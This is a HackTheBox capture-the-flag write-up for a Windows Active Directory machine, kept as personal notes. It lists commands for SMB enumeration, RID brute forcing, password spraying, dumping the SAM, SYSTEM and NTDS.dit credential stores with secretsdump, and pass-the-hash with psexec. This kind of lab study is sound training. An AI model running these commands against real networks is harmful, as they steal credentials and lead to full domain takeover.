---
os: Windows
status: Pwned
tags: [active-directory, smb, password-spray, sebackupprivilege, secretsdump]
aliases:
IP:
Secondary IP:
Hostname:
Domain:
SID:
VM: HackTheBox
Ports: 445, 5985
Notes: Password in SMB share, password spray, SeBackupPrivilege, SAM dump
---
# Resolution summary

>[!summary]
>- Anonymous SMB connect to /HR share found plaintext password
>- RID brute forced to enumerate domain users
>- Password sprayed with discovered password finding valid account
>- Enumerated domain with ldapdomaindump
>- Found plaintext password in user description field
>- Accessed DEV share with new credentials
>- Found backup script containing hardcoded credentials
>- WinRM access obtained
>- User had SeBackupPrivilege enabled
>- Saved SAM and SYSTEM registry hives
>- Used secretsdump to extract Administrator hash
>- Pass-the-hash with PSExec for SYSTEM access
>- Bonus: Backed up NTDS.dit using diskshadow

## Improved skills

- SMB enumeration and file discovery
- RID cycling for user enumeration
- Password spraying techniques
- LDAP enumeration
- SeBackupPrivilege exploitation
- Registry hive extraction
- Hash extraction with secretsdump
- Pass-the-hash attacks
- NTDS.dit backup and extraction

## Used tools

- [[SMBClient]]
- [[CrackMapExec]]
- ldapdomaindump
- [[Impacket]] secretsdump
- [[Impacket]] psexec
- diskshadow
- robocopy
- evil-winrm

---

# Information Gathering

Scanned all TCP ports:

```bash
nmap -sV -sC -p- <IP> -oA nmap_scans/cicada
```

Enumerated open TCP ports:

```bash
# Port 445 - SMB
# Port 5985 - WinRM
# Active Directory ports
```

---

# Enumeration

## Port 445 - SMB

Anonymous SMB access:
```bash
smbclient -L //<IP> -N
smbclient //<IP>/HR -N
```

Found plaintext password in HR share.

## RID Brute Force

Enumerated domain users via RID cycling:
```bash
crackmapexec smb <IP> -u guest -p '' --rid-brute
```

## Password Spraying

Sprayed discovered password against user list:
```bash
crackmapexec smb <IP> -u users.txt -p 'Password123' --continue-on-success
```

Found valid credentials.

## LDAP Enumeration

Dumped domain information:
```bash
ldapdomaindump -u 'DOMAIN\user' -p 'password' <IP>
```

Discovered plaintext password in user description field.

## SMB with New Credentials

Accessed DEV share:
```bash
smbclient //<IP>/DEV -U 'DOMAIN\user'
```

Found backup script with hardcoded credentials.

---

# Exploitation

## WinRM Access

Connected via WinRM with found credentials:
```bash
evil-winrm -i <IP> -u user -p password
```

---

# Privilege Escalation to Administrator

## Local enumeration

Checked user privileges:
```powershell
whoami /priv
```

Found SeBackupPrivilege enabled.

## Privilege Escalation vector

### Method 1: SAM and SYSTEM Dump

Saved registry hives:
```powershell
reg save HKLM\SAM C:\Temp\sam.hive
reg save HKLM\SYSTEM C:\Temp\system.hive
```

Downloaded files and extracted hashes:
```bash
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

Pass-the-hash with Administrator hash:
```bash
impacket-psexec -hashes :HASH administrator@<IP>
```

### Method 2 (Bonus): NTDS.dit Extraction

Created diskshadow script to backup disk:
```
# diskshadow script content
```

Used robocopy to copy NTDS.dit:
```powershell
robocopy /b <source> <destination> ntds.dit
```

Downloaded and extracted all domain hashes:
```bash
impacket-secretsdump -ntds ntds.dit -system system.hive LOCAL
```

---

# Trophy

>[!todo] **User.txt**
>Obtained via WinRM access

>[!todo] **Root.txt**
>Obtained via Pass-the-Hash PSExec
